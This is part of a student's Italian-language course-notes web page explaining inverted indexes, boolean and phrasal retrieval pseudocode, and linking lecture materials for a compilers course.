<td>\(D_{1},2\)</td>
<td>\(D_{2},3\)</td>
<td>\(D_{3},2\)</td>
</tr>
</tbody>
</table>
<p>Lo space requirment del vocabolario è abbastanza esiguo: esiste una legge che
descrive il suo andamento chiamata <code>Heaps law</code>.
Ovviamente la grandezza del vocabolario dipende da tutto il preprocessing che
viene fatto, quindi da come vengono generati i token e come vengono filtrati.</p>
<p>In generale, per gli inverted index <em>word-based</em> è circa \(O(n)\).
Solitamente è attorno al 40% se vengono omesse delle stopwords, altrimenti
se vengono mantenute si parla circa dell'80%. Nel <em>document based</em> invece
si parla del di valori tra il 20% e il 40%.</p>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Costruzione di un Inverted Index</p>
<p>Solitamente la costruzione si basa sulla memorizzazione del vocabolario
in un <strong>trie</strong>. Dopo aver fatto il preprocessing si seguono i seguenti
step:</p>
<ol>
<li>Leggere la parola del testo</li>
<li>Cercare la parola nel trie</li>
<li>Se non è presente, viene aggiunta, altrimenti viene
aggiornata la lista delle occorrenze di quella parola.</li>
</ol>
<p>Costo: \(O(n)\), dove n è la somma dei token da indicizzare.
Normalmente l&rsquo;inverted index viene diviso in due file, per dividere
il dizionario dalle posting list. Questo perchè il dizionario viene
caricato in memoria principale, mentre le posting list rimangono
in memoria secondaria e vengono accedute mediante degli offset.
Nel file del vocabolario vengono memorizzate le parole, e per ogni parola
un puntatore alla propria lista all&rsquo;interno del posting file.
Ecco un&rsquo;esempio di entry all&rsquo;interno di un vocabulary file:</p>
<ul>
<li>&ldquo;start&rdquo; indica l&rsquo;offset di inizio della lista;</li>
<li>&ldquo;n&rdquo; indica la lunghezza della lista corrispondente;</li>
</ul>
<table>
<thead>
<tr>
<th>Term</th>
<th>Start</th>
<th>n</th>
</tr>
</thead>
<tbody>
<tr>
<td>science</td>
<td>7</td>
<td>3</td>
</tr>
</tbody>
</table>
<p>Quando devo usare il vocabolario, in che struttura dati conviene caricarlo per
velocizzare la ricerca?
Per chiarezza: il trie di cui parlavamo prima viene usato in fase di
<strong>costruzione</strong>, per facilitarla. Una volta finita la fase di costruzione,
il file con il vocabolario viene memorizzato e il trie non serve più.
Rimane quindi da capire quale sia la struttura più efficiente in cui
<strong>caricare</strong>, in seguito, il vocabolario.</p>
<ol>
<li><strong>Sorted Array</strong> &ndash;&gt; ricerca binaria \((log(n))\). L&rsquo;inserimento è costoso, dato
che può comportare lo shifting degli elementi all&rsquo;interno della struttura.</li>
<li><strong>B+ Tree</strong> &ndash;&gt; veloce e efficiente ma comporta spazio extra, richiede
la gestione di una struttura dati aggiuntiva.</li>
<li><strong>Trie</strong></li>
<li><strong>Hash</strong></li>
</ol>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p>Ricerca</p>
<p><strong><code>Boolean Retrieval</code></strong></p>
<p>Un&rsquo;operazione interessante per quanto riguarda la ricerca, è la
risoluzione di semplici query binarie. Ad esempio, si supponga che
si vogliano cercare tutti i documenti che contengono entrambe
le parole &ldquo;computer&rdquo; e &ldquo;science&rdquo;.
In tal caso, supponendo che le due posting list contengano gli ID
dei documenti in maniera <strong>ordinata</strong>, basta un&rsquo;approccio a due
puntatori per risolvere il problema in \(O(n)\).</p>
<ul>
<li>\(p1\) &ndash;&gt; puntatore al primo elemento della posting list di &ldquo;computer&rdquo;, che contiene
la lista (ordinata) di documenti in cui compare la parola;</li>
<li>\(p2\) &ndash;&gt; puntatore al primo elemento della posting list di &ldquo;science&rdquo;;</li>
</ul>
<!-- raw HTML omitted -->
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">answer <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">while</span> p1 <span style="color:#f92672">!=</span> NULL <span style="color:#f92672">and</span> p2 <span style="color:#f92672">!=</span> NULL:
  <span style="color:#66d9ef">if</span> (doc_ID(p1) <span style="color:#f92672">==</span> doc_ID(p2)):
    answer<span style="color:#f92672">.</span>append(doc_ID(p1))
  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> doc_ID(p1) <span style="color:#f92672">&lt;</span> doc_ID(p2):
    p1 <span style="color:#f92672">=</span> p1<span style="color:#f92672">-&gt;</span>next;
 <span style="color:#66d9ef">else</span>
   p2 <span style="color:#f92672">=</span> p2<span style="color:#f92672">-&gt;</span>next;
<span style="color:#66d9ef">return</span> answer;
</code></pre></div><p><strong><code>Phrasal Retrieval</code></strong></p>
<p>Spesso è interessante sapere, ad esempio, in quali documenti e in che
posizione appare una determinata <strong>frase</strong>, quindi una sequenza di parole.
Ad esempio, si può essere interessati a capire in che posizione e in quali
documenti appare la stringa &ldquo;computer science&rdquo;. Come intuibile, non basta
sapere se in un documento appaiano entrambe, serve anche controllare che esse
siano contigue (in questo caso).
Per eseguire in maniera efficiente questa operazione è opportuno avere
un inverted index <strong>word based</strong>.
Si seguono i seguenti passi:</p>
<ol>
<li>Si crea una lista di documenti che contengono enrambe le parole, come
visto nel paragrafo precedente.</li>
<li>Si selezionano, uno alla volta, tutti i documenti di questa lista;</li>
<li>Per ogni documento, si creano \(n\) vettori, dove \(n\) indica il numero
di parole della frase (nel caso dell&rsquo;esempio, \(n=2\));
Ogni vettore contiene gli tutti gli <em>indici di apparizione</em> di quella
parola in quel documento;</li>
<li>Si cercano le tuple corrette all&rsquo;interno dei vettori. Nell&rsquo;esempio,
si vogliono individuare tutti gli indici \(i\) tali che
\(Computer_{i}+1 = Science_{j}\)</li>
</ol>
<p>Vettore delle apparizioni di &ldquo;Computer&rdquo; nel documento \(D_{1}\) \(\downarrow\)</p>
<table>
<thead>
<tr>
<th>i=0</th>
<th>i=1</th>
<th>i=2</th>
<th>i=3</th>
</tr>
</thead>
<tbody>
<tr>
<td>4</td>
<td>8</td>
<td>12</td>
<td>44</td>
</tr>
</tbody>
</table>
<p>Vettore delle apparizioni di &ldquo;Science&rdquo; sempre nel documento \(D_{1}\) \(\downarrow\)</p>
<table>
<thead>
<tr>
<th>i=0</th>
<th>i=1</th>
<th>i=2</th>
<th>i=3</th>
</tr>
</thead>
<tbody>
<tr>
<td>6</td>
<td>9</td>
<td>32</td>
<td>45</td>
</tr>
</tbody>
</table>
<p>In questo caso, la frase &ldquo;computer science&rdquo; compare agli indici 1 e 3,
perchè i valori corrispondenti sono contigui!
Ecco lo pseudocodice, da applicare ad ogni documento \(d \in D\):</p>
<ul>
<li>\(P\) = insieme di tutti gli array del documento corrente;</li>
<li>\(k_{i}\) = keyword i-esima;</li>
<li>\(P_{i}\) = array delle apparizioni di \(k_{i}\);</li>
<li>\(P_{s}\) = array delle apparizioni più corto;</li>
<li>\(k_{s}\) = keyword che compare meno volte;</li>
</ul>
<p>In questo caso, si intende semplicemente ritornare la lista dei documenti
che contengono la frase cercata.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> each position p <span style="color:#f92672">in</span> Ps:
  <span style="color:#66d9ef">for</span> each keyword ki <span style="color:#f92672">!=</span> ks: <span style="color:#75715e"># per tutte le altre keyword della frase</span>
    use BinarySearch to find a position (p<span style="color:#f92672">+</span>i<span style="color:#f92672">-</span>s) <span style="color:#f92672">in</span> Pi
  <span style="color:#66d9ef">if</span> correct position <span style="color:#66d9ef">for</span> each keyword found, add d to answer <span style="color:#75715e"># d is current document</span>
  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">try</span> <span style="color:#66d9ef">with</span> next position, going on <span style="color:#66d9ef">with</span> loop
<span style="color:#66d9ef">return</span> answer
</code></pre></div></li>
</ul>
<h2 id="linguaggi-e-compilatori">Linguaggi e Compilatori<a href="#linguaggi-e-compilatori" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="compilatori">Linguaggi e compilatori<a href="#compilatori" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>

  <figure class="left" >
    <img src="/ox-hugo/compilers.jpeg"   />
    
  </figure>


<pre tabindex="0"><code class="language-example" data-lang="example">Questa pagina (in italiano) contiene i miei appunti del corso di
&quot;Linguaggi e Compilatori&quot; del corso di laura triennale in informatica di Unimore.
Il pdf contiene i miei appunti presi durante le lezioni.
Il materiale qui fornito non è sostitutivo alle slide del corso e/o il famigerato dragon book.
</code></pre><p>Link per accedere al <code>materiale didattico</code> \(\rightarrow\)</p>
<p><a href="https://drive.google.com/drive/u/0/folders/1vHe1CGEjwfiLwUCVj_ryZ8f_A-GPVX50">https://drive.google.com/drive/u/0/folders/1vHe1CGEjwfiLwUCVj_ryZ8f_A-GPVX50</a></p>
<p>Link agli <code>appunti</code>  \(\downarrow\)</p>
<blockquote>
<p><a href="https://drive.google.com/drive/folders/1q29u03uP6MI_a18g_1HWsYkzaMwYKFgA?usp=sharing">https://drive.google.com/drive/folders/1q29u03uP6MI_a18g_1HWsYkzaMwYKFgA?usp=sharing</a></p>
</blockquote>
<p>Link al <code>tutorial</code> di riferimento \(\downarrow\)</p>
<blockquote>
<p><a href="https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/index.html">https://llvm.org/docs/tutorial/MyFirstLanguageFrontend/index.html</a></p>
</blockquote>
<ul>
<li>📃 <a href="https://theelandor.github.io/prova/201022.html">Lezione 20/10/22</a></li>
<li>📃 <a href="https://theelandor.github.io/prova/261022.html">Lezione 26/10/22</a></li>
<li>📃 <a href="https://theelandor.github.io/prova/271022.html">Lezione 27/10/22</a></li>
</ul>

      </div></div>

  

  
  <script>
  MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      displayMath: [['$$','$$'], ['\\[', '\\]']],
      processEscapes: true,
      processEnvironments: true
    },
    options: {
      skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
    }
  };

  window.addEventListener('load', (event) => {
      document.querySelectorAll("mjx-container").forEach(function(x){
        x.parentElement.classList += 'has-jax'})
    });

</script>
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script type="text/javascript" id="MathJax-script" async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>

  
</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>







  
</div>

</body>
</html>
